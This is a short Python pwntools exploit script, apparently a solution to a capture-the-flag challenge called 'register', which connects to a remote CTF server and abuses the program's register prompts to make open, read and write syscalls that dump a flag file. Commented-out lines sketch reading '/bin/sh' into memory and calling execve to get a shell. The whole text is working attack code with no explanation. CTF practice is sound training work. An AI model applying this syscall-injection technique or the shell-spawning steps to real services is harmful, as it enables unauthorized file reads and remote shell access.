from pwn import *
#r=process("./register")
r=remote("ctf.j0n9hyun.xyz",3026)

obj=0x6010A0 #rax 0,1,2 allowed
rdi=0x6010A8
rsi=0x6010B0
rdx=0x6010B8
rcx=0x6010C0
r8=0x6010C8
r9=0x6010D0
context.log_level='debug'
bss=0x6010e0
def send(payload):
    r.sendlineafter("RAX: ",payload[0])
    r.sendlineafter("RDI: ",payload[1])
    r.sendlineafter("RSI: ",payload[2])
    r.sendlineafter("RDX: ",payload[3])
    r.sendlineafter("RCX: ",payload[4])
    r.sendlineafter("R8: ",payload[5])
    r.sendlineafter("R9: ",payload[6])

send(['2',str(0x6010C8),'0','0','0',str(0x67616c66),'0']) # open(0x6010c8(r8),0(read_onlye)) (r8='flag')
send(['0','3',str(bss),str(0x40),'0','0','0'])  #read(3,bss,0x40)
send(['1','1',str(bss),str(0x40),'0','0','0'])  #write(1,bss,0x40)

#send(['0','0',str(bss),'8','0','0','0'])       #read(0,bss,8)
#r.send('/bin/sh\x00')                          
#sleep(4)
#send(['59',str(bss),'0','0','0','0','0'])      #execve('/bin/sh',0,0)

r.interactive()